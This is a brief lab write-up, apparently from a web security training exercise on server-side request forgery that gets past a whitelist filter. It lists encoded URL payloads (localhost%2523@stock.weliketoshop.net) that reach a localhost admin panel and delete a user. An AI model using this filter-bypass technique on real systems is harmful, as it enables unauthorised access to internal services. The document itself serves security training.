Lab #4 - SSRF with whitelist-based input filter

Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 

Analysis:

localhost: http://localhost%2523@stock.weliketoshop.net
admin interface: http://localhost%2523@stock.weliketoshop.net/admin
delete user: http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos